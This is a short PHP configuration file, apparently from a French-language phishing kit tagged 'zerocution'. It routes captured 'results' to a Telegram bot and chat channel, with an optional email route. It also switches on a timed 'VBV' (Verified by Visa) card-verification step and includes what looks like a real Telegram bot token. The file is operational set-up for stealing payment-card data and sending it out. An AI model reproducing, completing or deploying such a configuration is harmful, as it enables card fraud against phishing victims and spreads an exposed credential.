<?php

#zerocution

# Mail
$mail_send = FALSE;                                           # False pour ne pas recevoir par Mail
$rezmail = "email@email.com";

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "7086889636:AAGC9WBj1v1vjbZlX-RnX3ut4etigxfwmUg";

$rez_chat = "-4231281476";                                 # Channel de réception des informations

# VBV

$vbv = true;
$timeVBV = "15";

# DEV

$test_mode = false;

?>